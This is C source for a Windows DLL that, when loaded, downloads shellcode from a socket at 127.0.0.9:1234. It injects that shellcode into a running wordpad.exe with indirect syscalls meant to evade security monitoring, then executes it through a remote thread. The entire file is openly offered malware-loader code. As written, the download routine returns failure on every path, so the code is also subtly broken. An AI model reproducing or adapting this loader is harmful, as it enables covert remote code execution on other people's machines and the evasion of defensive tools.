#include <winsock2.h>
#include <ws2tcpip.h>
#include "syscalls/syscalls.h"
#include "mainDLL.h"

#define BUFFER_SIZE 1024


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        injectPayload();
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

BOOL injectPayload() {
    NTSTATUS Status = 0;
    BOOL State = TRUE;
    HMODULE NtdllHandle = NULL;
    PVOID Buffer = NULL;
    HANDLE thread = NULL;
    HANDLE procH = NULL;
    OBJECT_ATTRIBUTES OA;

    SIZE_T shellcodeSize = BUFFER_SIZE;
    unsigned char shellcode[BUFFER_SIZE];

    if (!downloadPayload(shellcode, shellcodeSize)) {
        return TRUE;
    }

    NtdllHandle = getModuleHandle();
    if (NtdllHandle == NULL) {
        return TRUE;
    } 

    if (
        !IndirectPrelude(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall) ||
        !IndirectPrelude(NtdllHandle, "NtAllocateVirtualMemoryEx", &g_NtAllocateVirtualMemoryExSSN, &g_NtAllocateVirtualMemoryExSyscall) ||
        !IndirectPrelude(NtdllHandle, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN, &g_NtWriteVirtualMemorySyscall) ||
        !IndirectPrelude(NtdllHandle, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN, &g_NtProtectVirtualMemorySyscall) ||
        !IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall) ||
        !IndirectPrelude(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN, &g_NtFreeVirtualMemorySyscall) ||
        !IndirectPrelude(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN, &g_NtWaitForSingleObjectSyscall) ||
        !IndirectPrelude(NtdllHandle, "NtClose", &g_NtCloseSSN, &g_NtCloseSyscall)
    ) {
        return TRUE;
    }

    DWORD PID = getProcessPID("wordpad.exe");
    CLIENT_ID CID = {PID, NULL};
    InitializeObjectAttributes(&OA, NULL, 0, NULL, NULL);

    Status = NtOpenProcess(&procH, PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, &OA, &CID);
    if (STATUS_SUCCESS != Status) {
        return TRUE;
    }

    Status = NtAllocateVirtualMemoryEx(procH, &Buffer, &shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE, NULL, 0);
    if (STATUS_SUCCESS != Status) {
        State = FALSE; goto CLEANUP;
    }

    ULONG oldProtect;
    Status = NtWriteVirtualMemory(procH, Buffer, &shellcode, shellcodeSize, NULL);
    if (STATUS_SUCCESS != Status) {
        State = FALSE; goto CLEANUP;
    }

    Status = NtProtectVirtualMemory(procH, &Buffer, (PULONG)&shellcodeSize, PAGE_EXECUTE, &oldProtect);
    if (STATUS_SUCCESS != Status) {
        State = FALSE; goto CLEANUP;
    }

    Status = NtCreateThreadEx(&thread, THREAD_QUERY_INFORMATION, &OA, procH, Buffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        State = FALSE; goto CLEANUP;
    }

    LARGE_INTEGER timeout;
    timeout.QuadPart = INFINITE;
    Status = NtWaitForSingleObject(thread, FALSE, &timeout);

CLEANUP:
    if (Buffer) {
        Status = NtFreeVirtualMemory(procH, &Buffer, &shellcodeSize, MEM_DECOMMIT);
    }

    if (thread) {
        NtClose(thread);
    }

    if (procH) {
        NtClose(procH);
    }

    return TRUE;
}

BOOL downloadPayload(unsigned char* shellcode, size_t limit) {
    size_t totalBytesReceived = 0;
    SOCKET WSAAPI clientSocket = INVALID_SOCKET;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return FALSE;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        goto CLEANUP;
    }

    struct sockaddr_in clientAddress = {0};
    clientAddress.sin_family = AF_INET;
    clientAddress.sin_port = htons(1234); 
    clientAddress.sin_addr.s_addr = inet_addr("127.0.0.9");

    if (connect(clientSocket, (struct sockaddr*)&clientAddress, sizeof(clientAddress)) == SOCKET_ERROR) {
        goto CLEANUP;
    }

    const char* message = "Hello, Server!";
    if (send(clientSocket, message, (int)strlen(message), 0) == SOCKET_ERROR) {
        goto CLEANUP;
    } 

    size_t bytesRead = 0;
    while (totalBytesReceived < limit) {
        bytesRead = recv(clientSocket, (char*)shellcode + totalBytesReceived, (int)(limit - totalBytesReceived), 0);
        if (bytesRead == -1) {
            goto CLEANUP;
        }
        totalBytesReceived += bytesRead;
    }

CLEANUP:
    if (clientSocket != INVALID_SOCKET) {
        closesocket(clientSocket);
    }

    WSACleanup();
    return FALSE;
}
